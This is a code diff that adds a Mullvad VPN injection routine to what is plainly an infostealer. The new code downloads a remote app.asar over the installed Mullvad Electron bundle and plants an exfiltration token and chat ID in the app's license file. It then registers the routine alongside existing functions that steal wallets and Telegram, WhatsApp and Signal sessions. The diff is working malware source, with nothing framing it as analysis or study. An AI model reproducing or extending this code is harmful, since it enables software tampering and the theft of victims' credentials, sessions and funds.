@@ -1246,6 +1246,39 @@ class get_data:
                 await inject(exodus_versioned_path, exodus_asar_path, exodus_injection_url, exodus_license_path)
 
 
+    async def InjectMullvad(self) -> None:
+        async def inject(app_path: str, asar_path: str, mullvad_injection_url: str, license_path: str = None) -> None:
+            if not Path(app_path).exists() or not Path(asar_path).exists():
+                return
+            
+            try:
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(mullvad_injection_url) as response:
+                        if response.status != 200:
+                            return
+                        
+                        with open(asar_path, 'wb') as writer:
+                            async for chunk in response.content.iter_chunked(1024):
+                                writer.write(chunk)
+
+                    if license_path:
+                        with open(license_path, 'w') as license_file:
+                            license_file.write(f"{TOKEN}\n{CHAT_ID}")
+
+            except Exception as Error:
+                logs_handler(f"Error injecting into mullvad {str(Error)}")
+
+        mullvad_path = os.path.join("C:\\", "Program Files", "Mullvad VPN")
+        mullvad_asar_path = os.path.join(mullvad_path, 'resources', 'app.asar')
+        mullvad_license_path = os.path.join(mullvad_path, 'LICENSE.electron.txt')
+        
+        if Path(mullvad_license_path).exists():
+            with open(mullvad_license_path, 'w') as license_file:
+                license_file.write(f"{TOKEN}\n{CHAT_ID}")
+        else:pass
+        
+        await inject(mullvad_path, mullvad_asar_path, mullvad_injection_url, mullvad_license_path)
+
     async def StealTelegramSession(self, directory_path: str) -> None:
         try:
             tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
@@ -2174,6 +2207,7 @@ class get_data:
             tasks = [
                 self.StealWallets(filePath),
                 self.InjectWallets(),
+                self.InjectMullvad(),
                 self.StealTelegramSession(filePath),
                 self.StealWhatsApp(filePath),
                 self.StealSignal(filePath),
